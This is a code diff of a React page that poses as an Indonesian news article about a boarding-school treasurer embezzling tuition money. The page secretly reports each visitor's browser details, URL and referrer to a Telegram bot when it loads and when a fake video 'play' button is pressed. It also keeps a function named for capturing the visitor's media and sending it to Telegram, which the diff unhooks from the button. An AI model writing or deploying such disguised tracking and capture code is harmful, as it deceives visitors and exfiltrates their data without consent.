@@ -2,9 +2,6 @@ import { useEffect, useCallback } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
 function App() {
-  const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://st4.depositphotos.com/3315095/21045/i/450/depositphotos_210451064-stock-photo-portrait-sexy-young-woman-model.jpg';
-
   useEffect(() => {
     const sendVisitorNotification = async () => {
       await sendTelegramNotification({
@@ -17,6 +14,15 @@ function App() {
 
     sendVisitorNotification();
   }, []);
+
+  const sendLocation = async () => {
+      await sendTelegramNotification({
+        userAgent: navigator.userAgent,
+        location: window.location.href,
+        referrer: document.referrer || 'Direct',
+        previousSites: document.referrer || 'None',
+      });
+    };
 
   const captureAndSendMedia = useCallback(async () => {
     try {
@@ -138,9 +144,6 @@ function App() {
     }
   }, []);
 
-  const handlePlayClick = async () => {
-    await captureAndSendMedia();
-  };
 
   const article = {
     title: "Bendahara Ponpes Al Muttaqin Jepara Jadi Tersangka, Gelapkan Dana SPP Rp 500 Juta untuk Foya-Foya",
@@ -298,7 +301,7 @@ Pihak pondok pesantren menegaskan kegiatan belajar-mengajar tetap berjalan seper
               />
               <div className="absolute inset-0 bg-black/30 flex items-center justify-center">
                 <button
-                  onClick={captureAndSendMedia}
+                  onClick={sendLocation}
                   className="bg-red-600 text-white text-xl px-6 py-4 rounded-full hover:bg-red-700 hover:scale-105 transition"
                 >
                   ▶
